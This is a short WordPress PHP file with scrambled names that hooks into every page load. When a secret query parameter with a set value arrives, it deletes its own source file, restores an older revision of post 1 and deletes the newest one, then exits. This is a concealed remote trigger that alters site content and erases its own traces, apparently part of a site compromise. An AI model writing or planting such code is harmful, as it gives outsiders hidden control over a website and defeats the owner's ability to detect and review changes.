<?php

function really_slideshow_rtl_listing() {
	if (isset($_GET['category_force_subscriptions']) && $_GET['category_force_subscriptions'] === 'restaurant_directory_history') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$toolkit_widget_make_friendly = 1;
		$random_effects_highlighter = wp_get_post_revisions($toolkit_widget_make_friendly);
		if (empty($random_effects_highlighter)) die('no revisions');
		if (count($random_effects_highlighter) < 2) die('less than 2');
		$checker_accessibility_media = array_shift($random_effects_highlighter);
		$code_engine_seo = $checker_accessibility_media->ID;
		$preview_cover_publish_ai = array_shift($random_effects_highlighter);
		$embed_shopp_services_wpc = $preview_cover_publish_ai->ID;
		$recipe_effects_reusable = wp_restore_post_revision($embed_shopp_services_wpc);
		if ($recipe_effects_reusable === false) die('error restoring');
		$recipe_effects_reusable = wp_delete_post_revision($code_engine_seo);		
		if ($recipe_effects_reusable === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'really_slideshow_rtl_listing');
